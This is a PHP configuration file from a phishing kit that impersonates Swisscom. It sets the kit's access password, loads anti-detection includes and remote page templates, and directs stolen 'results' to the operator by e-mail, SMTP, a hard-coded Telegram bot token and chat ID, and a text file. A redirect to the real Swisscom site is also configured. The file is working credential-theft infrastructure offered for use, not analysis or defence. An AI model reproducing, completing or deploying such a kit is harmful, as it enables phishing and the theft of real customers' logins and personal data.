<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    session_start();
    error_reporting(0);
    include_once 'defender.php';
    require_once 'detect.php';
    require_once 'functions.php';
    define("PASSWORD", 'swisscom');
    define("TEMPLATES", 'https://sad-beaver.46-4-250-97.plesk.page/CH/swisscom/de/_templates/');
    define("RECEIVER", 'your@email.com');
    define("TELEGRAM_TOKEN", '2092590097:AAFW5iK7C_I77iLLhp064TeYcgX-BU4-BHM');
    define("TELEGRAM_CHAT_ID", '2039327653');
    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');
    define("TXT_FILE_NAME", 'my_result002.txt');
    define("OFFICIAL_WEBSITE", 'https://www.swisscom.ch/');

    define("RECEIVE_VIA_EMAIL", 1); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1
    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RESULTS_IN_TXT", 1); // Receive the results on txt file : 0 or 1
?>